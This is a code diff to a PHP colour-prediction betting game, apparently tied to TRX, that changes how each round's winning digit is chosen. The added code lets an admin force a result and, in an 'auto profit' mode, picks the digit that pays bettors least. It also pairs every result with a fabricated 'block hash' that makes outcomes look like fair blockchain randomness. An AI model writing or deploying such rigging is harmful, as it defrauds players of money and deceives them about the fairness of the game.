@@ -56,9 +56,23 @@ function trx_generate_result($firebase, $typeId, $periodId) {
         return $existing;
     }
     
+    // Check for admin override
+    $override = $firebase->get('admin_overrides/trx_t' . $typeId);
+    if ($override != null && isset($override['number']) && isset($override['active']) && $override['active'] == true) {
+        $winningDigit = (int)$override['number'];
+        $firebase->update('admin_overrides/trx_t' . $typeId, ['active' => false]);
+    } else {
+        $bets = $firebase->get('game_bets/' . $fbTypeKey . '/' . $periodId);
+        $autoProfit = $firebase->get('system_settings/auto_profit_trx');
+        if (($autoProfit === true || $autoProfit === 'true' || $autoProfit === 1 || $autoProfit === '1') && $bets != null && is_array($bets) && count($bets) > 0) {
+            $winningDigit = trx_calculate_house_optimal($bets);
+        } else {
+            $winningDigit = rand(0, 9);
+        }
+    }
+    
     // Generate simulated block hash and block number
     $blockNumber = (int)(rand(60000000, 69900000));
-    $winningDigit = rand(0, 9);
     $hash = md5(uniqid() . $blockNumber) . $winningDigit;
     $color = trx_get_color($winningDigit);
     
@@ -77,7 +91,9 @@ function trx_generate_result($firebase, $typeId, $periodId) {
     $firebase->set('game_results/' . $fbTypeKey . '/' . $periodId, $result);
     
     // Settle bets
-    $bets = $firebase->get('game_bets/' . $fbTypeKey . '/' . $periodId);
+    if (!isset($bets)) {
+        $bets = $firebase->get('game_bets/' . $fbTypeKey . '/' . $periodId);
+    }
     if ($bets != null && is_array($bets)) {
         trx_settle_bets($firebase, $typeId, $periodId, $winningDigit, $color, $hash, $bets);
     }
@@ -222,5 +238,59 @@ function trx_ensure_recent_results($firebase, $typeId, $count = 10) {
     }
     
     return $results;
+}
+
+function trx_calculate_house_optimal($bets) {
+    // Aggregate bets by selectType
+    $betTotals = array_fill(0, 15, 0); // 0-9 numbers, 10=red, 11=green, 12=violet, 13=big, 14=small
+    
+    foreach ($bets as $bet) {
+        if (!isset($bet['selectType']) || !isset($bet['contractAmount'])) continue;
+        $st = $bet['selectType'];
+        $amt = (float)$bet['contractAmount'];
+        
+        if (is_numeric($st)) {
+            $stNum = (int)$st;
+            if ($stNum >= 0 && $stNum <= 9) {
+                $betTotals[$stNum] += $amt;
+            }
+        } else {
+            if ($st === 'red') $betTotals[10] += $amt;
+            elseif ($st === 'green') $betTotals[11] += $amt;
+            elseif ($st === 'violet') $betTotals[12] += $amt;
+            elseif ($st === 'big') $betTotals[13] += $amt;
+            elseif ($st === 'small') $betTotals[14] += $amt;
+        }
+    }
+    
+    // Calculate payout for each possible winning digit
+    $payouts = [];
+    for ($d = 0; $d <= 9; $d++) {
+        $payout = $betTotals[$d] * 9; // Direct number bet: 9x
+        
+        // Color bets
+        if ($d == 0) {
+            $payout += $betTotals[10] * 1.5; // Red gets 1.5x for 0
+            $payout += $betTotals[12] * 4.5; // Violet gets 4.5x
+            $payout += $betTotals[14] * 2;   // Small gets 2x
+        } elseif ($d == 5) {
+            $payout += $betTotals[11] * 1.5; // Green gets 1.5x for 5
+            $payout += $betTotals[12] * 4.5; // Violet gets 4.5x
+            $payout += $betTotals[13] * 2;   // Big gets 2x
+        } elseif (in_array($d, [1, 3, 7, 9])) {
+            $payout += $betTotals[11] * 2;   // Green gets 2x
+            if ($d <= 4) $payout += $betTotals[14] * 2; // Small
+            else $payout += $betTotals[13] * 2;          // Big
+        } else { // 2, 4, 6, 8
+            $payout += $betTotals[10] * 2;   // Red gets 2x
+            if ($d <= 4) $payout += $betTotals[14] * 2; // Small
+            else $payout += $betTotals[13] * 2;          // Big
+        }
+        
+        $payouts[$d] = $payout;
+    }
+    
+    // Return digit with minimum payout
+    return array_search(min($payouts), $payouts);
 }
 ?>
